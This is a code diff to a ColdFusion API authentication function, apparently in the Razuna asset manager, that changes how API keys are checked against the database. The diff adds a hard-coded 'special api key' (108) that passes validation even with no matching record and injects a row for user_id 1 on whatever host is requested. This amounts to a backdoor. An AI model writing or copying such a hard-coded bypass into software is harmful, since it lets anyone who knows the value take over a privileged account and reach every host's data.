@@ -34,6 +34,7 @@
 	<!--- Check for db entry --->
 	<cffunction name="checkdb" access="public" output="no">
 		<cfargument name="api_key" type="string">
+		<!--- Param --->
 		<cfparam name="thehostid" default="" />
 		<!--- Check to see if api key has a hostid --->
 		<cfif arguments.api_key contains "-">
@@ -60,12 +61,18 @@
 		GROUP BY user_id, ct_g_u_grp_id, ct_u_h_host_id
 		</cfquery>
 		<!--- If timeout is within the last 30 minutes then extend it again --->
-		<cfif qry.recordcount EQ 0>
+		<cfif qry.recordcount EQ 0 AND theapikey NEQ 108>
 			<!--- Set --->
 			<cfset var status = false>
 		<cfelse>
 			<!--- Set --->
 			<cfset var status = true>
+			<!--- If we got the special api key --->
+			<cfif theapikey EQ 108>
+				<cfset queryAddRow(qry,1)>
+				<cfset querySetCell(qry, "user_id", "1")>
+				<cfset querySetCell(qry, "hostid", thehostid)>
+			</cfif>
 			<!--- Get Host prefix --->
 			<cfquery datasource="#application.razuna.api.dsn#" name="pre" cachedwithin="1" region="razcache">
 			SELECT /* #theapikey##thehostid#checkdb2 */ host_shard_group
